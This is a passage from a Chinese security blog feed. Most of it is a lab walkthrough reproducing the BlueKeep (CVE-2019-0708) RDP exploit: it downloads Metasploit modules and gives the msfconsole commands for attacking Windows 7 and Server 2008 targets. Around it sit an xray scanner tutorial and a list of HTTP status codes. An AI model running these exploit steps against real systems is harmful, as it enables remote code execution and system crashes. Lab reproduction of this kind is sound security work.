class="lozad"></p></blockquote><p>未安装证书前，提示证书风险，访问https的网站会提示证书风险</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162937.png" class="lozad"></p><h2 id="3-2-安装证书"><a href="#3-2-安装证书" class="headerlink" title="3.2 安装证书"></a>3.2 安装证书</h2><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162955.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163000.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163017.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163024.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163040.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163046.png" class="lozad"></p><h2 id="3-3-测试"><a href="#3-3-测试" class="headerlink" title="3.3 测试"></a>3.3 测试</h2><p>安装好证书后，重启浏览器，再次访问百度，可以看到没有证书不安全的标志了，说明证书安装成功</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163105.png" class="lozad"></p><p>碰巧还看到了检测出一个漏洞</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163112.png" class="lozad"></p><h1 id="0x04-使用技巧"><a href="#0x04-使用技巧" class="headerlink" title="0x04 使用技巧"></a>0x04 使用技巧</h1><h2 id="4-1-常用命令"><a href="#4-1-常用命令" class="headerlink" title="4.1 常用命令"></a>4.1 常用命令</h2><p>虽然在刚刚前面的快速使用中命令有很多种，但是常用的命令就那几个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure><p>浏览器设置本地代理，以360浏览器为例</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163124.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163135.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163150.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163156.png" class="lozad"></p><p>然后通过浏览器手动点击一些页面，xray会自动对这些页面进行测试，非常好用</p><h2 id="4-2-结合burpsuite插件passive-scan使用"><a href="#4-2-结合burpsuite插件passive-scan使用" class="headerlink" title="4.2 结合burpsuite插件passive scan使用"></a>4.2 结合burpsuite插件passive scan使用</h2><h3 id="4-2-1-原理"><a href="#4-2-1-原理" class="headerlink" title="4.2.1 原理"></a>4.2.1 原理</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163206.png" class="lozad"></p><h3 id="4-2-2-使用教程"><a href="#4-2-2-使用教程" class="headerlink" title="4.2.2 使用教程"></a>4.2.2 使用教程</h3><p>开启xray代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163214.png" class="lozad"></p><p>开启burpsuite和浏览器代理</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029112816.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029112734.png" class="lozad"></p><p>开启passive scan client插件</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029113144.png" class="lozad"></p><p>然后，就可以正常的使用burpsuite进行测试，手动测试的流量数据会自动通过代理插件发送到xray扫描器进行被动扫描，既不耽误测试，又不用担心被封IP 等危险。</p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p>1、<a href="https://www.anquanke.com/post/id/184204" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184204</a></p><p>2、<a href="https://www.jishuwen.com/d/2TvQ" target="_blank" rel="noopener">https://www.jishuwen.com/d/2TvQ</a></p><p>3、 <a href="https://chaitin.github.io/xray" target="_blank" rel="noopener">https://chaitin.github.io/xray</a></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xray </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-0708复现教程</title>
      <link href="/2019/09/11/CVE-2019-0708%E5%A4%8D%E7%8E%B0%E6%95%99%E7%A8%8B/"/>
      <url>/2019/09/11/CVE-2019-0708%E5%A4%8D%E7%8E%B0%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前几天，随着CVE-2019-0708漏洞EXP的现世，顿时让安全圈躁动起来，大家都通过官网的一些文档教程来自己搭建环境复现漏洞，而菜鸡的我，复现了好久，却久久不能复现成功，今天再次复现，发现了问题的所在，再次献上自己的复现教程，虽然网上教程已经泛滥。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911173741.png" class="lozad"></p><a id="more"></a><h1 id="0x01-测试环境"><a href="#0x01-测试环境" class="headerlink" title="0x01 测试环境"></a>0x01 测试环境</h1><blockquote><p>攻击机：kali Linux 2019.2</p><p>靶机：Windows7 ultimate SP1 </p><p>Windows server 2008 R2标准版</p><p>攻击框架：metasploit</p><p>EXP：cve_2019_0708_bluekeep_rce</p></blockquote><h1 id="0x02-相关文件下载"><a href="#0x02-相关文件下载" class="headerlink" title="0x02 相关文件下载"></a>0x02 相关文件下载</h1><p>CVE-2019-0708 exp下载地址：<a href="https://github.com/mai-lang-chai/CVE-2019-0708-RCE/blob/master/CVE-2019-0708RDPMSF%E6%94%BB%E5%87%BB%E5%A5%97%E4%BB%B6.zip" target="_blank" rel="noopener">传送门</a></p><p>Windows7 ultimate SP1下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</span><br></pre></td></tr></table></figure><p>Windows server 2008 R2标准版下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ed2k://|file|cn_windows_server_2008_r2_hpc_edition_with_service_pack_1_x64_dvd_700632.iso|3071051776|7FDEE0F7A49FC63148D4DE580D803742|/</span><br></pre></td></tr></table></figure><h1 id="0x03-开搞"><a href="#0x03-开搞" class="headerlink" title="0x03 开搞"></a>0x03 开搞</h1><h2 id="3-1-跟新metasploit框架"><a href="#3-1-跟新metasploit框架" class="headerlink" title="3.1 跟新metasploit框架"></a>3.1 跟新metasploit框架</h2><p>首先需要跟新到最新的metasploit框架，版本是5.0.47版本</p><p>跟新命令脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br></pre></td></tr></table></figure><p>跟新完成的版本截图</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174035.png" class="lozad"></p><p>跟新后可能会出现如下两个问题</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174058.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174146.png" class="lozad"></p><p>意思是没有启动带数据库支持的MSF服务需要我们去启动，其实这对于复现漏洞没有影响，就是看着难受</p><p>【解决方法】</p><p>我们使用<code>exit</code>退出<code>msfconsole</code>,然后输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure><p>输入完成后等待显示：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174310.png" class="lozad"></p><p>这个字样在输入：msfdb init</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174325.png" class="lozad"></p><p>再次输入msfconsole，问题解决</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174344.png" class="lozad"></p><h2 id="3-2-替换exp文件"><a href="#3-2-替换exp文件" class="headerlink" title="3.2 替换exp文件"></a>3.2 替换exp文件</h2><p>首先需要下载0708的exp文件，这个文件在前面以及分享过了，也可以利用wget命令直接下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure><p> 然后，进入刚刚下载的exp的目录，然后使用下面命令替换原来的exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cp rdp.rb /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">cp rdp_scanner.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">cp cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line"></span><br><span class="line">mkdir /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp  <span class="comment">##创建rdp目录</span></span><br><span class="line"></span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><h2 id="3-3-开始复现"><a href="#3-3-开始复现" class="headerlink" title="3.3 开始复现"></a>3.3 开始复现</h2><h3 id="3-3-1-Windows-7-x64-sp1配置"><a href="#3-3-1-Windows-7-x64-sp1配置" class="headerlink" title="3.3.1 Windows 7 x64 sp1配置"></a>3.3.1 Windows 7 x64 sp1配置</h3><p>第一步：关闭防火墙</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175227.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175304.png" class="lozad"></p><p><img alt="1568195617145" data-src="C:%5CUsers%5C10367%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1568195617145.png" class="lozad"></p><p>第二步：开启3389远程</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175410.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175444.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175542.png" class="lozad"></p><h3 id="3-3-2使用的命令"><a href="#3-3-2使用的命令" class="headerlink" title="3.3.2使用的命令"></a>3.3.2使用的命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole <span class="comment">##进入metasploit框架</span></span><br><span class="line">reload_all <span class="comment">##重新载入漏洞模块</span></span><br><span class="line">search 0708 <span class="comment">##搜索0708的漏洞</span></span><br><span class="line">use exploit/windows/rdp/cve_2019_0708_bluekeep _rce  <span class="comment">##0708RDP攻击模块</span></span><br><span class="line">info  <span class="comment">##查看漏洞的相关信息</span></span><br><span class="line">show options <span class="comment">##查看需要设置的参数</span></span><br><span class="line"><span class="built_in">set</span> rhosts <span class="comment">##靶机ip ##设置需要攻击的靶机ip地址</span></span><br><span class="line">show targets  <span class="comment">##显示可以攻击的靶机类型</span></span><br><span class="line"><span class="built_in">set</span> target 数字 <span class="comment">##设置攻击的靶机类型</span></span><br><span class="line">exploit <span class="comment">##开始利用</span></span><br></pre></td></tr></table></figure><blockquote><p>msfconsole</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180426.png" class="lozad"></p><blockquote><p>reload_all</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180514.png" class="lozad"></p><blockquote><p>search 0708</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180532.png" class="lozad"></p><blockquote><p>info</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Name: CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free</span><br><span class="line">Module: exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">Platform: Windows</span><br><span class="line">Arch: </span><br><span class="line">       Privileged: Yes</span><br><span class="line">License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Manual</span><br><span class="line">  Disclosed: 2019-05-14</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Sean Dillon &lt;sean.dillon@risksense.com&gt;</span><br><span class="line">  Ryan Hanson &lt;dunno@findthisout.com&gt;</span><br><span class="line">  OJ Reeves &lt;oj@beyondbinary.io&gt;</span><br><span class="line">  Brent Cook &lt;bcook@rapid7.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic targeting via fingerprinting</span><br><span class="line">  1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)</span><br><span class="line">  2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox)</span><br><span class="line">  3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare)</span><br><span class="line">  4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name             Current Setting  Required  Description</span><br><span class="line">  ----             ---------------  --------  -----------</span><br><span class="line">  RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect</span><br><span class="line">  RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET = random</span><br><span class="line">  RDP_DOMAIN                        no        The client domain name to report during connect</span><br><span class="line">  RDP_USER                          no        The username to report during connect, UNSET = random</span><br><span class="line">  RHOSTS                            yes       The target address range or CIDR identifier</span><br><span class="line">  RPORT            3389             yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 952</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  The RDP termdd.sys driver improperly handles binds to internal-only </span><br><span class="line">  channel MS_T120, allowing a malformed Disconnect Provider Indication </span><br><span class="line">  message to cause use-after-free. With a controllable data/size </span><br><span class="line">  remote nonpaged pool spray, an indirect call gadget of the freed </span><br><span class="line">  channel is used to achieve arbitrary code execution.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-2019-0708/</span><br><span class="line">  https://github.com/zerosum0x0/CVE-2019-0708</span><br><span class="line"></span><br><span class="line">Also known as:</span><br><span class="line">  Bluekeep</span><br></pre></td></tr></table></figure><blockquote><p>show options</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180651.png" class="lozad"></p><blockquote><p>set rhosts 靶机IP地址</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180915.png" class="lozad"></p><blockquote><p>show targets</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180936.png" class="lozad"></p><blockquote><p>set target 3</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911181004.png" class="lozad"></p><blockquote><p>exploit</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911181144.png" class="lozad"></p><p>ps: run和exploit都行</p><h1 id="0x04-复现结果"><a href="#0x04-复现结果" class="headerlink" title="0x04 复现结果"></a>0x04 复现结果</h1><p>Windows server 2008 R2标准版出现蓝屏</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175744.png" class="lozad"></p><p>Windows 7 ultimate sp1复现结果</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175754.png" class="lozad"></p><h1 id="0X05-漏洞检测修复工具-amp-批量快速扫描检测工具-amp-热补丁工具"><a href="#0X05-漏洞检测修复工具-amp-批量快速扫描检测工具-amp-热补丁工具" class="headerlink" title="0X05 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具"></a>0X05 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具</h1><blockquote><p>（来源奇安信公众号）</p></blockquote><p>【下载页面】<br><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank" rel="noopener">https://www.qianxin.com/other/CVE-2019-0708</a><br>【使用说明】</p><p>1、 下载文件进行解压。<br>2、 使用win+R快捷键或开始菜单选择“运行”，输入cmd。调起命令行工具。<br>3、 在命令行工具，执行命令到工具所在文件夹<br>4、 输入命令对应功能，启用热补丁命令：QKShield.exe /enable ；禁用热补丁命令：QKShield.exe/disable 。<br>5、 重启系统后，需要重新运行命令行来启用热补丁</p><p>【实现效果】<br>在工具支持的系统中启用热补丁后，用漏洞扫描工具扫描结果为没有漏洞。漏洞扫描工具下载地址：<a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank" rel="noopener">传送门</a><br>支持系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Windows XP <span class="keyword">for</span> 32-bit Systems Service Pack 3</span><br><span class="line">Windows 7 <span class="keyword">for</span> 32-bit Systems</span><br><span class="line">Windows 7 <span class="keyword">for</span> x64-based Systems</span><br><span class="line">Windows 7 <span class="keyword">for</span> 32-bit Systems Service Pack 1</span><br><span class="line">Windows 7 <span class="keyword">for</span> x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2003 <span class="keyword">for</span> 32-bit Systems Service Pack 2</span><br><span class="line">Windows Server 2003 R2 <span class="keyword">for</span> 32-bit Systems Service Pack2</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> 32-bit Systems Service Pack 2</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> 32-bit Systems Service Pack 2(Server Core installation)</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> x64-based Systems Service Pack2</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> x64-based Systems Service Pack2 (Server Core installation)</span><br><span class="line">Windows Server 2008 R2 <span class="keyword">for</span> x64-based Systems ServicePack 1</span><br><span class="line">Windows Server 2008 R2 <span class="keyword">for</span> x64-based Systems ServicePack 1 (Server Core installation)</span><br><span class="line">暂不支持的系统：</span><br><span class="line">Windows Server 2003 <span class="keyword">for</span> x64-based Systems Service Pack2</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> Itanium-Based Systems ServicePack 2</span><br><span class="line">Windows Server 2008 R2 <span class="keyword">for</span> Itanium-Based SystemsService Pack 1</span><br></pre></td></tr></table></figure><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>从漏洞刚出来开始，我就开始复现，然后各种安装环境，操作系统，但是都没有复现成功，然后看各种文章，感觉都是那些基本操作，么有什么其他地方，然后我使用Windows 7 X64 ultimate sp1 和Windows server 2008 R2都没有复现成功，弄了两天我放弃了，今天我的一天同事也复现这个漏洞，点出了我的错误所在，原来，我讲set target 3 写成了set targets 3 ，我真是太粗心了，没有注意细节，以为show targets命令是列出可攻击的目标列表，就像当然的认为设置目标是set targets了。。。,然后一直复现不成功</p><p><img alt="img" data-src="https://i02piccdn.sogoucdn.com/d535d591ed8c8755" class="lozad"></p><p>最后，自己要记住这个教训，细节注定成败，而我这次败在了细节上，希望自己以后不会忽略这些小细节。共勉 :D</p><h1 id="0x06-参考文档"><a href="#0x06-参考文档" class="headerlink" title="0x06 参考文档"></a>0x06 参考文档</h1><ol><li><a href="https://blog.csdn.net/weixin_44114370/article/details/89440153" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44114370/article/details/89440153</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzAxNjQ1NDQ0Mw==&amp;mid=2247483662&amp;idx=1&amp;sn=9927dd8b4df7e710ddc4d8b02f922d8d&amp;chksm=9bf5c74aac824e5cfbde1c6587b6fdb149d464bc822a5b764f25538183e6e64934d549461d5d&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1567824187733&amp;sharer_shareid=6236dccf93a9257bd8ba451703af334b&amp;key=ee95eb58550bee7fb822e11f9b1822af1833bae210322a6de084b4219a556826d764fbbf32aa5607dc4acf61a722ef8421901382f992c938d121d6226db2bc2b35a9d19b0eec3693f4a44e6b5d0298de&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62060841&amp;lang=zh_CN&amp;pass_ticket=5vOsZrZPCHS2PeMt2y%2FquS927zFQZnSX%2FB%2FcGniqOlND7FA0KtfW5jlUG4BlXuNP" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAxNjQ1NDQ0Mw==&amp;mid=2247483662&amp;idx=1&amp;sn=9927dd8b4df7e710ddc4d8b02f922d8d&amp;chksm=9bf5c74aac824e5cfbde1c6587b6fdb149d464bc822a5b764f25538183e6e64934d549461d5d&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1567824187733&amp;sharer_shareid=6236dccf93a9257bd8ba451703af334b&amp;key=ee95eb58550bee7fb822e11f9b1822af1833bae210322a6de084b4219a556826d764fbbf32aa5607dc4acf61a722ef8421901382f992c938d121d6226db2bc2b35a9d19b0eec3693f4a44e6b5d0298de&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62060841&amp;lang=zh_CN&amp;pass_ticket=5vOsZrZPCHS2PeMt2y%2FquS927zFQZnSX%2FB%2FcGniqOlND7FA0KtfW5jlUG4BlXuNP</a></li><li><a href="https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961" target="_blank" rel="noopener">https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961</a> </li><li><a href="https://github.com/mai-lang-chai/CVE-2019-0708-RCE" target="_blank" rel="noopener">https://github.com/mai-lang-chai/CVE-2019-0708-RCE</a></li><li><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank" rel="noopener">https://www.qianxin.com/other/CVE-2019-0708</a></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的HTTP响应状态码</title>
      <link href="/2019/09/10/%E5%B8%B8%E8%A7%81%E7%9A%84HTTP%E5%93%8D%E5%BA%94%E7%8A%B6%E6%80%81%E7%A0%81/"/>
      <url>/2019/09/10/%E5%B8%B8%E8%A7%81%E7%9A%84HTTP%E5%93%8D%E5%BA%94%E7%8A%B6%E6%80%81%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在学习渗透测试的过程中，经常过碰到各种各样的服务器响应状态码，比如200,302,403,500等等。今天就给大家介绍一下常见的http状态码。</p><a id="more"></a><h1 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h1><p>100 –继续–请求者应当继续提出请求。服务器已收到请求的一部分，正在等待其余部分</p><p>101 –切换协议–请求者已要求服务器切换协议，服务器已确认并准备切换</p><p>200 –成功–服务器已成功处理了请求</p><p>201 –已创建–请求成功并且服务器创建了新的资源</p><p>202 –已接受–服务器已接受请求，但尚未处理</p><p>203 –非授权信息–服务器已成功处理了请求，但返回的想你想可能来自另一个源</p><p>204  –无内容–服务器成功处理了请求，但没有返回任何内容</p><p>205 –重置内容–服务器成功处理了请求，内容被重置</p><p>206 –部分内容–服务器成功处理部分请求</p><p>300 –多种选择–针对请求，服务器可执行多种操作</p><p>301 –永久移动 –请求的网页已永久移动到新的位置，即永久重定向</p><p>302 –临时移动–请求的网页暂时跳转到其他按页面，即暂时重定向</p><p>303 –查看其他位置–如果原来的请求是POST，重定向目标文档应该通过GET提取</p><p>304 –未修改–此次请求返回的网页未修改，继续使用上次的资源</p><p>305 –使用代理–请求者应该使用代理访问该网页</p><p>307 –临时重定向–请求的资源临时从其他位置响应</p><p>400 –错误请求–服务器无法解析该请求</p><p>401 –未授权–请求没有进行身份验证或者验证未通过</p><p>403 –禁止访问–服务器拒绝此请求</p><p>404 –未找到–服务器找不到请求的网页</p><p>405 –方法禁用–服务器禁用了请求中指定的方法</p><p>406 –不接受 –无法使用请求的内容响应请求的网页。</p><p>407 –需要代理授权–请求者需要使用代理授权</p><p>408 –请求超时–服务器请求超时</p><p>409 –冲突–服务器在完成请求时发生冲突</p><p>410 –已删除–请求的资源已永久删除</p><p>411 –需要有效长度–服务器不接受不含有有效内容长度表头字段的请求。</p><p>501 –未实现–服务器不具备完成请求的功能<br>502 –错误网关–服务器作为网关或者代理，从上游服务器收到无效响应<br>503 –服务不可用–服务器目前无法使用<br>504 –网关超时–服务器作为网关或者代理，但是没有及时从上游服务器收到请求<br>505 –HTTP版本不支持–服务器不支持请求中所用的HTTP协议版本</p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP状态码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础Linux命令</title>
      <link href="/2019/09/05/%E5%9F%BA%E7%A1%80Linux%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/09/05/%E5%9F%BA%E7%A1%80Linux%E5%91%BD%E4%BB%A4/</url>
      
